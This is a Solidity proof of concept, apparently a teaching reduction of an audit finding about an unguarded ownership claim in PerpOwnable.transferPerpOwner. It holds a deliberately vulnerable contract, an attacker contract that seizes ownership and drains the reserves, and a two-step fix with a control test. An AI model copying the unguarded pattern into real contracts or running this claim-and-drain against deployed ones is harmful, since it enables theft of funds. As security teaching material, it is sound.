// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Increment — PerpOwnable.transferPerpOwner (Trail of Bits, September 2022)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the first caller of transferPerpOwner sets perp. There is no
    role check and no accept step. Eve claims perp, the admin's call reverts
    OwnershipAlreadyClaimed, and Eve pulls the 1,000 UA reserves that only
    perp can move.
    The assignment is PerpOwnable.sol L29-L35 from the September 2022 review.
    The pull is the privileged action that ownership grants; an address change
    alone is not the harm. */

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PerpOwnable {
    error PerpOwnable_TransferZeroAddress();
    error PerpOwnable_OwnershipAlreadyClaimed();
    error PerpOwnable_NotPerp();

    address public perp;
    Token public ua;

    event PerpOwnerTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(Token ua_) {
        ua = ua_;
    }

    function transferPerpOwner(address recipient) external virtual {
        if (recipient == address(0)) revert PerpOwnable_TransferZeroAddress();
        // @> VULN: the first caller sets perp. No role and no accept step.
        if (perp != address(0)) revert PerpOwnable_OwnershipAlreadyClaimed();
        perp = recipient;
        emit PerpOwnerTransferred(msg.sender, recipient);
    }

    function pull(address to, uint256 amount) external {
        if (msg.sender != perp) revert PerpOwnable_NotPerp();
        ua.transfer(to, amount);
    }
}

contract PerpOwnableTwoStep is PerpOwnable {
    error NotAdmin();
    error NotPending();

    address public admin;
    address public pending;

    constructor(Token ua_, address admin_) PerpOwnable(ua_) {
        admin = admin_;
    }

    function transferPerpOwner(address recipient) external override {
        if (msg.sender != admin) revert NotAdmin();
        if (recipient == address(0)) revert PerpOwnable_TransferZeroAddress();
        pending = recipient;
    }

    function acceptPerpOwner() external {
        if (msg.sender != pending) revert NotPending();
        if (perp != address(0)) revert PerpOwnable_OwnershipAlreadyClaimed();
        perp = msg.sender;
        pending = address(0);
    }
}

contract Eve {
    function take(PerpOwnable book) external {
        book.transferPerpOwner(address(this));
    }

    function grab(PerpOwnable book, address to, uint256 amount) external {
        book.pull(to, amount);
    }

    function accept(PerpOwnableTwoStep book) external {
        book.acceptPerpOwner();
    }
}

contract Market {
    function acceptAndPull(PerpOwnableTwoStep book, address to, uint256 amount) external {
        book.acceptPerpOwner();
        book.pull(to, amount);
    }
}

abstract contract OwnableScenario {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address public constant TREASURY = 0x2222222222222222222222222222222222222222;
    uint256 public constant LOCKED = 1000 ether;

    Token public token;
    PerpOwnable public book;
    Eve public eve;
    Market public market;

    function _wire(bool twoStep) internal {
        token = new Token();
        if (twoStep) {
            book = new PerpOwnableTwoStep(token, address(this));
        } else {
            book = new PerpOwnable(token);
        }
        eve = new Eve();
        if (twoStep) market = new Market();
    }
}

contract Exploit is OwnableScenario {
    constructor() {
        _wire(false);
    }

    function run() external {
        token.mint(address(book), LOCKED);
        eve.take(book);
        (bool adminClaim,) = address(book).call(
            abi.encodeWithSignature("transferPerpOwner(address)", TREASURY)
        );
        require(!adminClaim, "admin took perp");
        require(book.perp() == address(eve), "eve is not perp");
        eve.grab(book, ATTACKER, LOCKED);
        require(token.balanceOf(ATTACKER) == LOCKED, "attacker was not paid");
        require(token.balanceOf(address(book)) == 0, "reserves remain");
    }
}

contract ControlExploit is OwnableScenario {
    constructor() {
        _wire(true);
    }

    function run() external {
        token.mint(address(book), LOCKED);
        (bool stole,) = address(eve).call(abi.encodeWithSignature("take(address)", address(book)));
        require(!stole, "eve nominated herself");
        (bool accepted,) = address(eve).call(abi.encodeWithSignature("accept(address)", address(book)));
        require(!accepted, "eve accepted");
        (bool grabbed,) = address(eve).call(
            abi.encodeWithSignature("grab(address,address,uint256)", address(book), ATTACKER, LOCKED)
        );
        require(!grabbed, "eve pulled");
        require(book.perp() == address(0), "perp set");
        require(token.balanceOf(ATTACKER) == 0, "attacker paid");
        require(token.balanceOf(address(book)) == LOCKED, "reserves moved");
        PerpOwnableTwoStep(address(book)).transferPerpOwner(address(market));
        market.acceptAndPull(PerpOwnableTwoStep(address(book)), TREASURY, LOCKED);
        require(book.perp() == address(market), "market is not perp");
        require(token.balanceOf(TREASURY) == LOCKED, "treasury");
        require(token.balanceOf(ATTACKER) == 0, "attacker still paid");
    }
}
